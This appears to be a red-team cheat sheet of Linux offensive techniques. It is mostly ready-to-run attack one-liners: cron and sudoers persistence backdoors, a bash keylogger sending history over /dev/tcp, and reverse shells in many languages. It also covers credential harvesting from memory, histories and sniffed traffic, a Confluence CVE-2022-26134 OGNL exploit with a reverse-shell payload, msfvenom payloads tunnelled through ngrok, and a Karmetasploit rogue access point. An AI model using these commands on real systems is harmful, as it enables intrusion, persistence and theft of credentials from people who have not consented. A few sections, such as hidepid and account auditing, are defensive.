# Linux TTPs:

## One Liner to Add Persistence on a Box via Cron:

```
echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
```

On the attack platform: ```nc -lvp 1234```

## One Liner to Add Persistence on a Box via Sudoers File:

```
echo "%sudo  ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

## Find Server Strings from HTTP Responses:

Finding server strings from a file of URLs

```
curl -s --head -K servers.txt | grep -i server
```

## Search for Hardcoded Passwords:

```
grep -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' *
```

The regex is a POSIX ERE expression that matches

- (password|pwd|pass) - either password or pwd or pass
- [[:space:]]*=[[:space:]]* - a = enclosed with 0 or more whitespaces
- [[:alpha:]]+ - 1 or more letters.

To output matches, add -o option to grep

## Search for Passwords in Memory and Core Dumps:

Memory:

```
strings -n 10 /dev/mem | grep -i pass
```

Core Dump:

```
# Find PID
root@RoseSecurity# ps -eo pid,command

# Core dump PID
root@RoseSecurity# gcore <pid> -o dumpfile

# Search for passwords
root@RoseSecurity# strings -n 5 dumpfile | grep -i pass
```
 

## Username Enumeration with Getent:

```getent``` is a Unix command that helps a user get entries in a number of important text files called databases. This includes the passwd and group databases which store user information – hence getent is a common way to look up user details on Unix.

```
getent passwd <username>
```

## Utilize Crt.sh and EyeWitness to Enumerate Web Pages:

Uses crt.sh to identify certificates for target domain before screenshotting and actively scanning each webpage for login forms to use common credentials on.

```
root@RoseSecurity:~# curl -s 'https://crt.sh/?q=<Website_You_Want_To_Enumerate>&output=json' | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > ~/URLs.txt; eyewitness -f ~/URLs.txt --active-scan
```

## Nmap Scan Every Interface that is Assigned an IP:

```
ifconfig -a | grep -Po '\b(?!255)(?:\d{1,3}\.){3}(?!255)\d{1,3}\b' | xargs nmap -A -p0-
```

## Nmap IPv6 Nodes:

- All nodes multicast: ff02::1
- All routers multicast: ff02::2

Locate targets with builtin ```ping6``` command

```
$ ping6 ff02::1
$ ping6 ff02::2

# Look for neighbors
$ ip neigh

$ nmap -Pn -sV -6 fe80::20c0 -e eth0 --packet-trace
```

Utilize `ndp` to enumerate all of the current ndp entries.

```
$ ndp -an
```

## Nmap to Evaluate HTTPS Support:

```
nmap -p 443 --script=ssl-enum-ciphers <Target Domain>
```

## Testssl.sh:

Enumerating ciphers and encryption weaknesses using Testssl command line tool:

Download: https://testssl.sh/

The normal use case is  ```testssl.sh <hostname>```. 

Special cases:

```
testssl.sh --starttls smtp <smtphost>.<tld>:587 
testssl.sh --starttls ftp <ftphost>.<tld>:21
testssl.sh -t xmpp <jabberhost>.<tld>:5222 
testssl.sh -t xmpp --xmpphost <XMPP domain> <jabberhost>.<tld>:5222 
testssl.sh --starttls imap <imaphost>.<tld>:143
```

## Apache Flink Directory Traversal:

```
cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent
```

## Bash Keylogger:

```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```

## Recon for Specific Device Before Enumerating:

```
sudo tcpdump 'ether host XX:XX:XX:XX:XX:XX' -i en0 -vnt > CheckScan.txt |  tee CheckScan.txt | grep --line-buffered pattern | ( while read -r line; do sudo nmap -sV -n -T4 -O2 -oX NMAPScan.xml; rm CheckScan.txt; done; ) &
```

## Turn Nmap into a Vulnerability Scanner:

Download: https://github.com/scipag/vulscan

Usage:

```
nmap -sV --script=vulscan/vulscan.nse www.rosesecurity.com
```
## Nmap Using Multiple Scripts on One Target:

Usage:

```
nmap --script "http-*" <IP>
nmap --script "sql-*" <IP>
nmap --script "ftp-*" <IP>
```

## IDS/IPS Nmap Evasion:

Low and slow (-T2), Fast mode (-F), Append random data to sent packets (--data-length), Randomize hosts, and verbosely conduct service detection on a file of hosts and output to XML.

```
nmap -T2 -F --data-length 5 --randomize-hosts -sV -v -iL (targets.txt) -oX (output.xml)
```

## Finding Open FTP Servers:

Finding FTP servers that allow anonymous logons can assist in numerous red-teaming activities such as Nmap FTP bounce scans.

```
masscan -p 21 <IP Range> -oL ftp_servers.txt; nmap -iL ftp_servers.txt —script ftp-anon -oL open_ftp_servers.txt
```

## Scalable Heartbleed Hunting with Shodan:

Hunt for components susceptible to the Heartbleed vulnerability before exploiting the devices memory with this one-liner. This command requires an Academic Plus Shodan API key.

```
shodan search vuln:cve-2014-0160 --fields hostnames | awk NF > heartbleed_hosts.txt; cat heartbleed_hosts.txt | while read line; do heartbleed.py "$line"; done
```

## Extract Passwords from HTTP POST Requests:

```
sudo tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"
```
## BPF'ing DNS Records:

```
# All queries
tcpdump -nt 'dst port 53 and udp[10] & 0x80 = 0'

# All responses
tcpdump -nt 'src port 53 and udp[10] & 0x80 = 0x80'
```

## Important Files:

```
/boot/vmlinuz : The Linux Kernel file.
/dev/had : Device file for the first IDE HDD (Hard Disk Drive) /dev/hdc : Device file for the IDE Cdrom, commonly
/dev/null : A pseudo device
/etc/bashrc : System defaults and aliases used by bash shell. /etc/crontab : Cron run commands on a predefined time Interval. /etc/exports : Information of the file system available on network. /etc/fstab : Information of Disk Drive and their mount point. /etc/group : Information of Security Group.
/etc/grub.conf : grub bootloader configuration file.
/etc/init.d : Service startup Script.
/etc/lilo.conf : lilo bootloader configuration file.
/etc/hosts : Information on IP's and corresponding hostnames. /etc/hosts.allow : Hosts allowed access to services on local host. /etc/host.deny : Hosts denied access to services on local host. /etc/inittab : INIT process and interactions at various run level. /etc/issue : Allows to edit the pre-login message. /etc/modules.conf : Configuration files for system modules. /etc/motd : Message Of The Day
/etc/mtab : Currently mounted blocks information.
/etc/passwd : System users with password hash redacted. /etc/printcap : Printer Information
/etc/profile : Bash shell defaults
/etc/profile.d : Application script, executed after login. /etc/rc.d : Information about run level specific script. /etc/rc.d/init.d : Run Level Initialisation Script. /etc/resolv.conf : Domain Name Servers (DNS) being used by System. /etc/securetty : Terminal List, where root login is possible. /etc/shadow : System users with password hash.
/etc/skel : Script that populates new user home directory. /etc/termcap : ASCII file defines the behavior of Terminal. /etc/X11 : Configuration files of X-window System.
/usr/bin : Normal user executable commands.
/usr/bin/X11 : Binaries of X windows System.
/usr/include : Contains include files used by ‘c‘ program. /usr/share : Shared directories of man files, info files, etc. /usr/lib : Library files required during program compilation. /usr/sbin : Commands for Super User, for System Administration. /proc/cpuinfo : CPU Information
/proc/filesystems : File-system information being used currently. /proc/interrupts : Information about the current interrupts. /proc/ioports : All Input/Output addresses used by devices. /proc/meminfo : Memory Usages Information.
/proc/modules : Currently used kernel module.
/proc/mount : Mounted File-system Information.
/proc/stat : Detailed Statistics of the current System. /proc/swaps : Swap File Information.
/version : Linux Version Information.
/var/log/auth* : Log of authorization login attempts. /var/log/lastlog : Log of last boot process.
```

# Reverse Shells:

## Encrypted Reverse Shells with OpenSSL:

Generate SSL certificate:

```
openssl req -x509 -quiet -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

Start an SSL listener on your attacking machine using ```openssl```:

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

Run the payload on target machine using ```openssl```:

```
mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect 127.0.0.1:4444>/tmp/s 2>/dev/null;rm /tmp/s
```

## Bash:

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## PERL:

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP:

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby:

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat:

```
nc -e /bin/sh 10.0.0.1 1234
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
Netcat port scanner

```
echo "" | nc -nvw2 <IP> <Port Range>
```

Netcat and OpenSSL banner grabbing

```
ncat -vC --ssl www.target.org 443
openssl s_client -crlf -connect www.target.org:443
```

## Socat:

Reverse shell:

On the attack platform:

```
root@attacker# socat file:`tty`,raw,echo=0 tcp-listen:5555
```

On the victim platform:

```
user@victim $ socat tcp-connect:<Attacker IP>:5555 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

Bind shell:

On the attack platform:

```
root@attacker# socat FILE:`tty`,raw,echo=0 TCP:<Target IP>:5555
```

On the victim platform:

```
user@victim $ socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

## Java:

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

# Password Harvesting:

Passwords can be found in many places

```
# Process lists

user@victim $ ps -efw

# Usernames entered into login prompt by mistake

user@victim $ last -f /var/log/bmtp

# Usernames entered into command line arguments

user@victim $ cat /home/*/.*history

# Passwords saved in web files

user@victim $ grep -iR password /var/www

# SSH keys

user@victim $ cat /home/*/.ssh/id*
```

Enumerate password and account information with ```chage```

```
user@victim $ chage -l
```

## Unusual Accounts:

Look in /etc/passwd for new accounts in a sorted list:

```
user@RoseSecurity $ sort -nk3 -t: /etc/passwd | less
```

Look for users with a UID of 0:

```
user@RoseSecurity $ grep :0: /etc/passwd
```
## Enumerating with Finger:

Various information leak vulnerabilities exist in fingerd implementations. A popular attack involves issuing a '1 2 3 4 5 6 7 8 9 0' request against a Solaris host running fingerd.

```
# finger '1 2 3 4 5 6 7 8 9 0'@192.168.0.10

[192.168.0.10]

Login       Name               TTY         Idle    When    Where

root     Super-User            console      <Jun  3 17:22> :0 

admin    Super-User            console      <Jun  3 17:22> :0

daemon          ???                         < .  .  .  . >

bin             ???                         < .  .  .  . >

sys             ???                         < .  .  .  . >

adm      Admin                              < .  .  .  . >

lp       Line Printer Admin                 < .  .  .  . >

uucp     uucp Admin                         < .  .  .  . >

nuucp    uucp Admin                         < .  .  .  . >

listen   Network Admin                      < .  .  .  . >

nobody   Nobody                             < .  .  .  . >
```

Performing a finger user@target.host request is especially effective against Linux, BSD, Solaris, and other Unix systems, because it often reveals a number of user accounts.

```
# finger user@192.168.189.12

Login: ftp                              Name: FTP User

Directory: /home/ftp                    Shell: /bin/sh

Never logged in.

No mail.

No Plan.



Login: samba                            Name: SAMBA user

Directory: /home/samba                  Shell: /bin/null

Never logged in.

No mail.

No Plan.



Login: test                             Name: test user

Directory: /home/test                   Shell: /bin/sh

Never logged in.

No mail.

No Plan.
```

Poorly written fingerd implementations allow attackers to pipe commands through the service, which are, in turn, run on the target host by the owner of the service process (such as root or bin under Unix-based systems).

```
# finger "|/bin/id@192.168.0.135"

[192.168.0.135]

uid=0(root) gid=0(root)
```

## Changing MAC Addresses:

Look up vendor MAC you want to impersonate: https://mac2vendor.com/

Change MAC:

```
sudo ifconfig <interface-name> down
sudo ifconfig <interface-name> hw ether <new-mac-address> 
sudo ifconfig <interface-name> up
```

# Routers:

Resources:

```
 https://www.routerpasswords.com
```
# Metasploit Callback Automation:

Use AutoRunScript to run commands on a reverse shell callback

```
set AutoRunScript multi_console_command -rc /root/commands.rc
```

`/root/commands.rc` contains the commands you wish to run

Example:

```
run post/windows/manage/migrate
run post/windows/manage/killfw
run post/windows/gather/checkvm
```
## Metasploit Session Management:

List all sessions

```
msf6> sessions
```
Execute command across all sessions

```
msf6> sessions -C <command>
```

Kill all sessions

```
msf6> sessions -K
```

Upgrade a shell to a meterpreter session on many platforms

```
msf6> sessions -u
```

## Metasploit Tips I Discovered Too Late:

In order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set, you can use them in as many exploits and auxiliary modules as you like. You can also save them for use the next time you start msfconsole. However, the pitfall is forgetting you have saved globals, so always check your options before you run or exploit. Conversely, you can use the unsetg command to unset a global variable. In the examples that follow, variables are entered in all-caps (ie: LHOST), but Metasploit is case-insensitive so it is not necessary to do so.

```
msf > setg LHOST 192.168.1.101
LHOST => 192.168.1.101
msf > setg RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf > setg RHOST 192.168.1.136
RHOST => 192.168.1.136
```

To capture the output of modules ran within Metasploit, utilize the spool command and designate a destination log file.

```
msf6> spool /tmp/Company_A_DC.log
```

Enable RDP:

```
meterpreter > run getgui -u rosesecurity -p password
```

Cleanup RDP:

```
meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
```

Search for interesting files:

```
meterpreter> search -f *.txt
meterpreter> search -f *.zip
meterpreter> search -f *.doc
meterpreter> search -f *.xls
meterpreter> search -f config*
meterpreter> search -f *.rar
meterpreter> search -f *.docx
meterpreter> search -f *.sql
```

Attack outside of the LAN with ngrok:

First step, set up a free account in ngrok then start ngrok:

```
./ngrok tcp 9999

# Forwarding tcp://0.tcp.ngrok.io:19631 -> localhost:9999
```

Create malicious payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19631 -f exe > payload.exe
```
Start listener:

```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 0.0.0.0 set 
LPORT 9999 
exploit
```

Ingest Other Tools' Output Files:

```
# Start database
$ sudo systemctl start postgresql

# Initialize Metasploit database
$ sudo msfdb init

# Start msfconsole
$ msfconsole -q
msf6 >

# Help menu
msf6 > db_import -h

# Import other tool's output
msf6 > db_import ~/nmap_scan.xml

[*] Importing NMAP XML data
[*] Successfully imported  /home/kali/nmap_scan.xml
```

# Confluence CVE-2022-26134:

CVE-2022-26314 is an unauthenticated and remote OGNL injection vulnerability resulting in code execution in the context of the Confluence server (typically the confluence user on Linux installations). Given the nature of the vulnerability, internet-facing Confluence servers are at very high risk.

As stated, the vulnerability is an OGNL injection vulnerability affecting the HTTP server. The OGNL payload is placed in the URI of an HTTP request. Any type of HTTP method appears to work, whether valid (GET, POST, PUT, etc) or invalid (e.g. “BALH”). In its simplest form, an exploit abusing the vulnerability looks like this:

```
curl -v http://10.0.0.28:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/r7%22%29%7D/
```

Above, the exploit is URL-encoded. The exploit encompasses everything from the start of the content location to the last instance of /. Decoded it looks like this:

```
${@java.lang.Runtime@getRuntime().exec("touch /tmp/r7")}
```

Reverse Shell:

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

Decoded:

```
${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}
```

 ## SSH Dynamic Port Forwarding:
 
 Forwards one local port to multiple remote hosts; it is useful for accessing multiple systems.
 
 ```
 $ ssh -D 9000 RoseSecurity@pivot.machine
 ```
 
 Now, an attacker could utilize a SOCKS proxy or proxychains to access the systems.
 
 ```
 $ proxychains smbclient -L fileserver22
 ```
 
 ## Encrypted File Transfers with Ncat:
 
Suppose you have an SSH tunnel, and you want to copy a file to the remote machine. You could just scp it directly, but that opens up another connection. The goal is to re-use the existing connection. You can use ncat to do this:

```
# This is port forwarding, sending everything from port 31000 on the remote machine to the same port on the local machine
$ ssh -L 31000:127.0.0.1:31000

# On the remote system: 
$ ncat -lvnp 31000 127.0.0.1 > file

# On the local system:
$ ncat -v -w 2 127.0.0.1 31000 < file
```

No extra overhead. TCP takes care of error correction. SSH has already encrypted the pipe.

## Tsharking for Domain Users:

```
# Read a PCAP file
$ tshark -r <pcap> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u

# Active interface
$ tshark -i <interface> 'ntlmssp.auth.username' | awk '{print $13}' | sort -u
```

 ## Cloning Websites for Social Engineering with Wget:
 
 ```
 wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://site-to-download.com
 ```
 Here are the switches:
```
--mirror - applies a number of options to make the download recursive.
--no-parent – Do not crawl the parent directory in order to get a portion of the site only.
--convert-links - makes all the links to work properly with the offline copy.
--page-requisites - download JS and CSS files to retain the original page style when browsing a local mirror.
--adjust-extension - adds the appropriate extensions (e.g. html, css, js) to files if they were retrieved without them.
```

## Spidering the Web with Wget:

```
$ export https_proxy=https://127.0.0.1:8080

$ wget -r -P /tmp --no-check-certificate -e robots=off ‐‐recursive ‐‐no-parent http://example.com/
```

## Hiding PID Listings From Non-Root Users:

To prevent a user from seeing all the processes running on a system, mount the /proc file system using the hidepid=2 option:

```
$ sudo mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2 /proc

# 2: Process files are invisible to non-root users. The existence of a process can be learned by other means, but its effective user ID (UID) and group ID (GID) are hidden.
```
## Exporting Objects with Tshark:

To extract a file, read in a file, use the --export-objects flag and specify the protocol and directory to save the files. Without -Q, tshark will read packets and send to stdout even though it is exporting objects.

```
tshark -Q -r $pcap_file --export-objects $protocol,$dest_dir
```

Supported Protocols:

```
dicom: medical image
http: web document
imf: email contents
smb: Windows network share file
tftp: Unsecured file
```

## Rogue APs with Karmetasploit:

Karmetasploit is a great function within Metasploit, allowing you to fake access points, capture passwords, harvest data, and conduct browser attacks against clients.

Install Karmetasploit configuration:

```
root@RoseSecurity:~# wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt
root@RoseSecurity:~# apt update
```

Install and configure sqlite and DHCP server:

```
root@RoseSecurity:~# apt -y install isc-dhcp-server
root@RoseSecurity:~# vim /etc/dhcp/dhcpd.conf
root@RoseSecurity:~# apt -y install libsqlite3-dev
root@RoseSecurity:~# gem install activerecord sqlite3
```

Now we are ready to go. First off, we need to locate our wireless card, then start our wireless adapter in monitor mode with airmon-ng. Afterwards we use airbase-ng to start a new wireless network.

```
# Locate interface
root@RoseSecurity:~# airmon-ng

# Start monitoring
root@RoseSecurity:~# airmon-ng start wlan0

# Start AP
root@RoseSecurity:~# airbase-ng -P -C 30 -e "Fake AP" -v wlan0mon

# Assign IP to interface
root@RoseSecurity:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
```

Before we run our DHCP server, we need to create a lease database, then we can get it to listening on our new interface.

```
root@RoseSecurity:~# touch /var/lib/dhcp/dhcpd.leases
root@RoseSecurity:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0
```

Run Karmetasploit:

```
root@RoseSecurity:~# msfconsole -q -r karma.rc_.txt
```

At this point, we are up and running. All that is required now is for a client to connect to the fake access point. When they connect, they will see a fake ‘captive portal’ style screen regardless of what website they try to connect to. You can look through your output, and see that a wide number of different servers are started. From DNS, POP3, IMAP, to various HTTP servers, we have a wide net now cast to capture various bits of information.

